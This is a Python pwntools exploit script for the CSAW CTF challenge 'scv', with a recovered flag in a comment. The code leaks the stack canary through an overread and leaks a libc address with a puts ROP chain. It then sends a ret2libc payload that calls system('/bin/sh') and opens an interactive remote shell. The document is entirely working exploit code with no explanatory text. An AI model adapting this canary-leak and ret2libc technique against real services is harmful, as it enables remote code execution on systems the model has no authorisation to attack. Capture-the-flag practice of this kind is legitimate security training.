from pwn import *

host = "pwn.chal.csaw.io"
port = 3764
r = remote(host,port)

binary = ELF('./scv')
PUTSPLT = binary.plt['puts']
PUTSGOT = binary.got['puts']

#flag{sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11}

print 'puts_plt = '+hex(PUTSPLT)

print 'puts_got = '+hex(PUTSGOT)

#r=process('./scv')

#sleep(15)

pop_rdi_ret=0x400ea3

pop_rsi_r15_ret=0x400ea1

puts=0x602018

r.recvuntil(">>")


r.sendline("1")

r.recvuntil(">>")

payload='b'*167+'a'+'g'

r.send(payload)

r.recvuntil(">>")


r.sendline("2")

#b *0x400aaa

r.recvuntil('bbbbbbba')

addr=r.recvuntil('\n')

addr=addr[:-4:]

print addr

stri='0x'

for i in range(len(addr)-1,-1,-1):
	temp=hex(ord(addr[i]))

	#print temp
	checker=int(temp,16)
	offset=''
	if(checker<0x10):
		offset+='0'


	temp=str(temp)

	temp=temp.split('x',1)
		
	stri+=offset
	stri+=temp[1]


	#print 'address of position '+str(send)+' '+stri


dec=int(stri,16)
hx=hex(dec)


stack_chk_fail=0x60231C

canary=int(hx,16)

canary-=0x67

print 'Canary = '+ hex(canary)

main=0x400A96

payload='b'*167+'a'+p64(canary)+"\x90"*8+p64(pop_rdi_ret)+p64(PUTSGOT)+p64(PUTSPLT)+p64(main)
r.recvuntil(">>")

r.sendline("1")

r.recvuntil(">>")

r.send(payload)

r.recvuntil(">>")

r.sendline("3")

r.recvuntil("[*]BYE ~ TIME TO MINE MIENRALS...\n")

stack_puts=r.recvuntil('\n')

stack_puts=stack_puts[:-1:]

stri='0x'

for i in range(len(stack_puts)-1,-1,-1):
	temp=hex(ord(stack_puts[i]))

	#print temp
	checker=int(temp,16)
	offset=''
	if(checker<0x10):
		offset+='0'


	temp=str(temp)

	temp=temp.split('x',1)
		
	stri+=offset
	stri+=temp[1]


	#print 'address of position '+str(send)+' '+stri


dec=int(stri,16)
hx=hex(dec)

print 'stack_puts_addr : '+hx

libc = ELF('libc-2.23.so')

puts__=int(hx,16)

libc_base=puts__-libc.symbols['puts']
system=libc_base+libc.symbols['system']

offset_bin_sh=0x18CD17

libc_bin_sh=libc_base+offset_bin_sh


payload='b'*167+'a'+p64(canary)+"\x90"*8+p64(pop_rdi_ret)+p64(libc_bin_sh)+p64(system)+p64(main)
r.recvuntil(">>")

r.sendline("1")

r.recvuntil(">>")

r.send(payload)

r.recvuntil(">>")

r.sendline("3")



#r.recvuntil(">>")


#r.sendline("3")



r.interactive()
